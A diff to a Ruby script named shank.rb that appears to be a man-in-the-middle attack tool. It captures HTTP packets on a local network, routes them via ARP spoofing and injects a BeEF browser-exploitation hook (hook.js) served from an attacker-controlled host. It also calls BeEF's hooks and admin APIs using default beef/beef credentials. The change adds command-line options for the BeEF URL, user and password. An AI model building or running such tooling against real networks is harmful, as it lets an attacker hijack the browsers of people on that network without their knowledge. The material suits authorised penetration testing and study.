@@ -24,12 +24,49 @@ require 'ipaddr'
 require 'thread'
 require 'rest_client'
 require 'json'
+require 'optparse'
 
-DEBUG = true
+options = {}
+
 ARP_TIMEOUT = 30
 @beef_ip = '192.168.50.52'
 @beef_user = 'beef'
 @beef_pass = 'beef'
+@injection = "http://#{@beef_ip}:3000/hook.js"
+@beef_hooks = "http://#{@beef_ip}:3000/api/hooks"
+@beef_admin = "http://#{@beef_ip}:3000/api/admin"
+
+optparse = OptionParser.new do |opts|
+  opts.banner = "Usage: shank.rb [options] CIDR"	
+
+  options[:debug] = false
+  opts.on( '-d', '--debug', 'Pring debug output' ) do
+    options[:debug] = true
+  end   
+
+   opts.on( '-U', '--url URL ', 'The base URL for BeEF' ) do|url|
+	@injection = "#{url}/hook.js"
+	@beef_hooks = "#{url}/hooks"
+	@beef_admin = "#{url}/api/admin"
+	
+   end
+
+  opts.on( '-u', '--user USER', 'The BeEF Username' ) do|user|
+    @beef_user = user
+  end
+
+  opts.on( '-p', '--pass PASS', 'The BeEF Password' ) do|pass|
+    @beef_pass = pass
+  end
+
+   opts.on( '-h', '--help', 'Display this screen' ) do
+     puts opts
+     exit
+   end
+
+end
+
+optparse.parse!
 
 #require 'perftools'
 #PerfTools::CpuProfiler.start("/tmp/shank_prof2")
@@ -282,9 +319,6 @@ end
 # The stuff below here could be cleaned up a bit more.
 
 shank = Shank.new(ARGV[0], (ARGV[1] || "eth0"))
-@injection = "http://#{@beef_ip}:3000/hook.js"
-@beef_hooks = "http://#{@beef_ip}:3000/api/hooks"
-@beef_admin = "http://#{@beef_ip}:3000/api/admin"
 @alive_ips = []
 
 
@@ -341,7 +375,7 @@ http_thread = Thread.new do
   http_cap.stream.each do |packet|
     Thread.current[:packets] += 1
     start = Time.now
-    #puts "http" if DEBUG == true
+    #puts "http" if options[:debug] == true
     http_pkt = PacketFu::TCPPacket.new.read(packet, :strip => true)
     payload = http_pkt.payload
     # Do stuff to it
@@ -418,7 +452,7 @@ http_thread = Thread.new do
         end
       end
     end
-    #puts "gunna route http" if DEBUG == true
+    #puts "gunna route http" if options[:debug] == true
     shank.route_ip_packet(http_pkt)
   end
 end
